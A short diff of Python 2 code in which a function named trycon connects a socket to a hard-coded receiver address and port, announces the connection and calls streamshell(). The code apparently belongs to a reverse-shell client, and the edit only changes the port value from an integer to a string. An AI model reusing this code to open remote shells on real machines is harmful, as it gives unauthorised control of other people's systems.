@@ -13,7 +13,7 @@ def trycon():
     #dhost = raw_input('Receiver IP: ')
     #dport = raw_input('Port: ')
     dhost = ("192.168.2.112")
-	dport = 9999
+	dport = ("9999")
 	s.connect((dhost, int(dport)))
     s.send("[+] connection established")
     streamshell()
